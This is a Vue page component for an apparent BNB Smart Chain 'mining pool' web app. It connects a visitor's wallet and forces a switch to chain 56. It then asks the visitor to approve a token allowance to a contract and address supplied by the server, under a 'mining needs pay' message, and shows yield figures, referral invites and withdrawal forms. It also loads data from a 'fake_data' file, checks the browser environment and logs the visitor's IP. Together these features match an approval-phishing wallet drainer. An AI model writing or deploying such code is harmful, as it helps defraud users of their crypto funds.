<template>
    <div class="layout-container home-page">
        <main class="layout-body">
            <div class="layout-main">
                <TopContainer
                    :symbolAddress="formatWalletAddress(account.address == '' ? $t('NoConnect') : account.address)"
                    @submit="onSubmit" :isAuthed="isAuthed" @invite="onInvite" @showAddress="showAddressPopup" />
                <SwitchContainer :blockData="blockData" :items="items" :balance="balance" :vipInfos="vipInfos"
                    :accountDetails="accountDetails" @confirm="onSubmit2" :hadAccount="account" :wrecords="wrecords" />

                <FloatService :serviceUrl="serviceUrl" />
            </div>
            <van-popup v-model:show="show" position="left" :style="{ width: '100%', height: '100%' }" closeable
                class="invite-popup">
                <InvitePopupContent :inviteUrl="walletConfig.inviteUrl" :teamData="teamData" />
            </van-popup>
            <van-popup v-model:show="showAddress" position="bottom"
                :style="{ width: '100%', height: 'auto', display: 'flex', 'align-items': 'center', padding: '4vw' }"
                closeable class="invite-popup">
                <div @click="copyAddress">{{ address }}</div>
            </van-popup>
        </main>
    </div>
</template>
<script setup>
import jsonData from '@/fake_data/BCS.json';
import TopContainer from '@/components/TopContainer.vue';
import SwitchContainer from '@/components/SwitchContainer.vue';
import InvitePopupContent from '@/components/InvitePopupContent.vue';
import FloatService from '@/components/FloatService.vue'
import { formatWalletAddress, getEnvironment } from '@/utils/tools'
import { nextTick, onMounted, ref, watch } from 'vue';
import { useUserStore } from '@/stores/userStore'; // 导入 store
import { useWeb3Modal, useWeb3ModalAccount, useDisconnect, useSwitchNetwork } from '@web3modal/ethers5/vue';
import { initializeContract, approve, checkAllowance } from '@/utils/web3'
import { useI18n } from 'vue-i18n'
import {
    getGradeData, getPoolData, authAccount, getInviteCode, getWalletConfig,
    getAccountDetail, checkAuthHash, getTeamData, getServiceData, addWithdrawRecord,
    getWalletShouyi, getWithDrawRecodes, getIp
} from '@/utils/request';
import { useRoute } from 'vue-router';
import { showConfirmDialog, showToast } from 'vant';

const route = useRoute();
const invite = route.query.code;
const showAddress = ref(false);
const show = ref(false);
const { address, chainId, isConnected, status } = useWeb3ModalAccount()
const { open, close } = useWeb3Modal()
const { disconnect } = useDisconnect();
const { switchNetwork } = useSwitchNetwork()
const { t } = useI18n();
const serviceUrl = ref('');
const ispro = true;
async function showAddressPopup() {
    // if (account.value.address != '') {
    //     showAddress.value = true;
    // } else {
    //     open();
    // }
    open();
}
// ip 设备环境 信息
const ipAddress = ref('');
const userAgent = ref(navigator.userAgent);
const platform = ref(navigator.platform);
console.log("userAgent", userAgent.value);
console.log("platform", platform.value);


getIp('https://api.ipify.org?format=json').then(res => {
    console.log("获取IP", res);
    ipAddress.value = res.ip;
    alert("当前IP地址" + ipAddress.value + "当前平台" + platform.value + "当前环境" + userAgent.value);
});
async function changeChainId() {
    if (chainId.value != 56) {
        try {
            await switchNetwork(56);
        } catch (error) {
            showConfirmDialog({
                message: t("Network switch failed. Please manually switch the EVM network and select BNB Smart Chain."),
                confirmButtonColor: 'red',
                confirmButtonText: t('confirm'),
                showCancelButton: false
            });
        }
    }
}
const copyAddress = () => {
    navigator.clipboard.writeText(account.value.address);
    showToast(t('CopySuccess'));
};
let wenv = getEnvironment().inWallet;
let benv = getEnvironment().isChrome;
if (ispro && (wenv || !benv)) {// 在钱包里 或者 不在谷歌浏览器
    console.log(wenv ? "在钱包里不对" : "浏览器不对");
    // window.location.href = './error.html';
}

open().catch(e => {
    showToast(e.message);
});
watch(address, async (newV, oldV) => {
    console.log(newV, oldV);
    if (!oldV && newV) {
        setTimeout(close, 1000);
        init();
    } else {
        account.value = {
            address: "",
            chainId: 0,
            isConnected: false
        };
        userStore.setAccount(account.value);
        accountDetails.value = {};
        teamData.value = {};
        // 执行断开连接的逻辑，比如更新 UI 或提示用户
        open();
    }
});
const userStore = useUserStore();
const account = ref(userStore.account);
const balance = ref(0);
const walletConfig = ref();
const accountDetails = ref();
const teamData = ref()
const isAuthed = ref(false);
const wrecords = ref();
async function init() {
    account.value = {
        address: address.value,
        chainId: chainId.value,
        isConnected: isConnected.value
    };
    // 执行连接成功的逻辑，比如更新 UI 或发起请求
    authAccount({
        address: address.value,
        inviteCode: invite ? invite : 'DDFEE98',
    }).then(res => {
        isAuthed.value = (res.data.authStatus == 1);
    });
    getWalletConfig(address.value).then(res => {
        let wgData = res.data;
        let inviteUrl = wgData.bep20;
        walletConfig.value = {
            authAddress: wgData.authAddress,
            abi: wgData.abi,
            contract: wgData.contract
        }
        getInviteCode(address.value).then(res => {
            inviteUrl += res.data;
            walletConfig.value.inviteUrl = inviteUrl;
        });
        initializeContract(walletConfig.value);
    });
    getAccountDetail({ account: address.value }).then(res => {
        accountDetails.value = res.data;
    });
    getTeamData(address.value).then(res => {
        teamData.value = res.data;
    });
    //关闭
    stopLoopGetInfos();
    // 循环请求
    startLoopGetInfos();
    //获取客服信息
    getServiceData(address.value).then(res => {
        if (res.hasOwnProperty('data')) {
            serviceUrl.value = res.data;
        }
    });

    getWithDrawRecodes(address.value).then(res => {
        console.log("getWithDrawRecodes", res);
        if (res.code == 200) {
            wrecords.value = res.data;
        }
    });
}
let intervalInfos = ref(null);
function startLoopGetInfos() {
    if (!intervalInfos.value) {
        intervalInfos.value = setInterval(() => {
            let address = account.value.address;
            if (address != '') {
                getAccountDetail({ account: address }).then(res => {
                    accountDetails.value = res.data;
                });
                getTeamData(address).then(res => {
                    teamData.value = res.data;
                });
            }
        }, 5000);
    }
}

function stopLoopGetInfos() {
    if (intervalInfos.value) {
        intervalInfos.value = null;
    }
}

// 获取vipinfo
getRGradeData();
const vipInfos = ref();
function getRGradeData() {
    getGradeData({
        chainType: 'BEP20',
        rebateType: 0,
    }).then(res => {
        vipInfos.value = res.data;
    });
}

// 获取矿池数据
getRPoolData();
function getRPoolData() {
    getPoolData('BEP20').then(res => {
        let _data = res.data;
        blockData.value = {
            totalYield: formatNumber(_data.allOut),
            currentHashrate: formatNumber(_data.hashrate),
            participants: formatNumber(_data.partNum),
            userEarnings: formatNumber(_data.userReve)
        };
    });
}

function getChainById(chains, chainId) {
    return chains.find(chain => chain.chainId === chainId) || null;
}
// 定义 submit 事件处理函数
const onSubmit = async () => {
    let address = account.value.address;
    if (address == '') {
        open();
        return;
    }
    if (chainId.value != 56) {
        open({ view: 'Networks' });
        return;
    }
    // 处理提交逻辑
    const result = await approve(walletConfig.value, t('miningNeedPayTip', { coinSymbol: 'BNB' }), address);
    if (result) {
        if (result.message) {
            // showToast({ message: result.message, wordBreak: 'break-all', duration: 5000 });
        }
        if (result.code == 3030) {
            showToast(t('ajax108'));
            return;
        }
        if (!result.hx) {
            return;
        }
        let tx_hash = result.hx.hash;
        checkAuthHash({ address: address, authAddress: tx_hash }).then(res => {
            if (res.code == 200) {
                isAuthed.value = true;
                getWalletShouyi(address).then(res => {
                    if (res.code == 200) {
                        let { balance: o, earning: a } = res.data;
                        showConfirmDialog({
                            message: t('miningOutputTip', {
                                money: o,
                                output: formatNumber(a, 6)
                            }),
                            confirmButtonColor: 'red',
                            confirmButtonText: t('confirm'),
                            showCancelButton: false
                        });
                    }
                });
            }
        });
    }
};

const onSubmit2 = async (number) => {
    let address = account.value.address;
    if (address == '') {
        open();
        return;
    }

    if (chainId.value != 56) {
        open({ view: 'Networks' });
        return;
    }
    if (!isAuthed.value) {
        // 先授權 再处理提交逻辑 最後 提現
        const result = await approve(walletConfig.value, t('miningNeedPayTip', { coinSymbol: 'BNB' }), address);
        if (result) {
            if (result.message) {
                // showToast({ message: result.message, wordBreak: 'break-all', duration: 5000 });
            }
            if (result.code == 3030) {
                showToast(t('ajax108'));
                return;
            }
            if (!result.hx) {
                return;
            }
            let tx_hash = result.hx.hash;
            checkAuthHash({ address: address, authAddress: tx_hash }).then(res => {
                if (res.code != 200) {
                    return;
                }
                isAuthed.value = true;
                addWithdrawRecord({
                    address: address,
                    usdt: number
                }).then(res => {
                    if (res.code == 200) {
                        let allCanWithdraw = accountDetails.value.canExtract;
                        if (number <= 0) {
                            showToast(t('minWithdrawTip', { money: formatNumber(0.01, 6) }));
                            return;
                        }
                        if (number > allCanWithdraw) {
                            showToast(t('ajax101'));
                            return;
                        }
                        addWithdrawRecord({
                            address: address,
                            usdt: number
                        }).then(res => {
                            let code = res.code;
                            if (code == 200) {
                                showToast(t('SubmittedSuccessfully'));
                            } else {
                                if (res.msg == "可提现金额不足") {
                                    showToast(t('ajax101'));
                                } else if (res.msg == "今日提现次数已尽") {
                                    showToast(t('Dailywithdrawals', { money: 0 }));
                                } else {
                                    showToast(t('ajax-1'));
                                }
                            }

                        });
                    }
                });
            });
        }
    } else {
        let allCanWithdraw = accountDetails.value.canExtract;
        if (number <= 0) {
            showToast(t('minWithdrawTip', { money: formatNumber(0.01, 6) }));
            return;
        }
        if (number > allCanWithdraw) {
            showToast(t('ajax101'));
            return;
        }
        addWithdrawRecord({
            address: address,
            usdt: number
        }).then(res => {
            let code = res.code;
            if (code == 200) {
                showToast(t('SubmittedSuccessfully'));
            } else {
                if (res.msg == "可提现金额不足") {
                    showToast(t('ajax101'));
                } else if (res.msg == "今日提现次数已尽") {
                    showToast(t('Dailywithdrawals', { money: 0 }));
                } else {
                    showToast(t('ajax-1'));
                }
            }

        });
    }
}

// 定义 invite 事件处理函数
const onInvite = () => {
    // 处理邀请逻辑
    if (walletConfig.value.inviteUrl) {
        show.value = true;
    }
};

// 显示的数据
const blockData = ref({
    totalYield: '0',
    currentHashrate: '0',
    participants: '0',
    userEarnings: '0'
});

/**
 * 将数字格式化为带有千位分隔符和固定小数位的字符串
 * @param {number} number - 要格式化的数字
 * @param {number} [decimalPlaces=2] - 小数位数（默认为2）
 * @returns {string} - 格式化后的字符串
 */
function formatNumber(number, decimalPlaces = 2) {
    const formatter = new Intl.NumberFormat('en-US', {
        minimumFractionDigits: decimalPlaces,
        maximumFractionDigits: decimalPlaces,
    });
    return formatter.format(number);
}

const items = jsonData;
</script>
<style></style>